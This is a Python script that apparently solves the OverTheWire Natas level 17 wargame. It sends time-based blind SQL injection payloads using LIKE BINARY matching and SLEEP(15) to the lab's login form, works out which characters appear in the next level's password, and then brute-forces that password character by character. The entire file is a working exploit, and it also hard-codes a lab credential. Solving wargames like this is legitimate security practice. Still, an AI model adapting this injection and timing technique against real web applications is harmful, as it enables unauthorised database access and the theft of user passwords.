import requests
import time

natas17_pass = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
natas18_pass = ''  
auth=requests.auth.HTTPBasicAuth('natas17', natas17_pass)  
headers = {'content-type': 'application/x-www-form-urlencoded'}    
vocab = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
used_chars = ''
url = 'http://natas17.natas.labs.overthewire.org/index.php'

print("Searching \"%s\" for characters used in password....\n" %vocab)
for character in vocab:  
        data = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%2815%29+%23'.format(character)  
        result = requests.post(url, auth=auth, data=data, headers=headers)  
        if result.elapsed.seconds >= 14:  
                used_chars += character  

print("[*] Characters used in password: \"" + used_chars + "\"\n[*] Beginning brute-force attack using \"" + used_chars + "\" characters")
for i in range(32):  
        for character in used_chars:  
                data = 'username=natas18%22%20and%20password%20like%20binary%20\'{0}%25\'%20and%20sleep(15)%23'.format(natas18_pass + character) 
                result = requests.post(url, auth=auth, data=data, headers=headers)  
                if result.elapsed.seconds >= 14:  
                        natas18_pass += character
                        break  
print("[*] natas18 : %s" %natas18_pass)
